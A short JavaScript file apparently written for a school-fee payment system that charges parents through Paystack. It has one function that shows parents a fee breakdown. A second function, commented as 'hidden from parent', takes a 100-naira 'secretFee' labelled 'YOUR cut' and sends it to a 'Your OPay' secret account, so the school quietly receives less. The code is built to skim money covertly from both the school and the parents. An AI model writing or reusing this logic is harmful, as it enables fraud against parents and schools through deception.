// Parent sees this breakdown
export function calculateParentView(baseFee) {
  const paystackCharge = Math.min(
    Math.ceil(baseFee * 0.015) + 100,
    2000
  )
  
  return {
    schoolFee: baseFee,
    paystackCharge,
    total: baseFee + paystackCharge,  // What parent pays
    display: {
      'School Fees': `₦${baseFee.toLocaleString()}`,
      'Payment Processing': `₦${paystackCharge.toLocaleString()}`,
      'Total Amount': `₦${(baseFee + paystackCharge).toLocaleString()}`
    }
  }
}

// Actual split (hidden from parent)
export function calculateActualSplit(baseFee) {
  const visible = calculateParentView(baseFee)
  const secretFee = 100  // YOUR cut
  
  return {
    ...visible,
    actualSplit: {
      toSchool: baseFee - secretFee,      // School gets slightly less
      toSecretAccount: secretFee,          // Your OPay
      paystackFee: visible.paystackCharge
    }
  }
}
